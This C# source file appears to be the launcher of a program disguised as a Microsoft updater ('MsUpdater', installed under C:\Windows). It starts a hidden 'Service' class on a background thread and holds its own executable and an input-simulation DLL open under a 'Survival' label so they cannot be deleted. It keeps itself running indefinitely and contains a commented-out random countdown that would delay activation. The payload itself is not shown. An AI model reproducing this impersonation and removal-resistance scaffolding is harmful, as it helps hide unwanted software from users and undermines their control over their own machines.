namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.CompilerServices;
    using System.Threading;

    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            Thread.Sleep(200);

            /*
             
            // ---- Code for stable version ---- //

            var target = Path.Combine(directory, "trigger");
            
            if (!File.Exists(target))
            {
                File.WriteAllText(target, new Random().Next(20, 40).ToString());
                goto Survival;
            }

            var content = int.Parse(File.ReadAllLines(target).Single());

            if (content != 0)
            {
                File.WriteAllText(target, (content - 1).ToString());

                goto Survival;
            }

            */

            new Thread(() => RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle)).Start();

            Survival:

            var a = File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read);
            var b = File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read);

            Process.GetCurrentProcess().WaitForExit();

            GC.KeepAlive(a);
            GC.KeepAlive(b);
        }
    }
}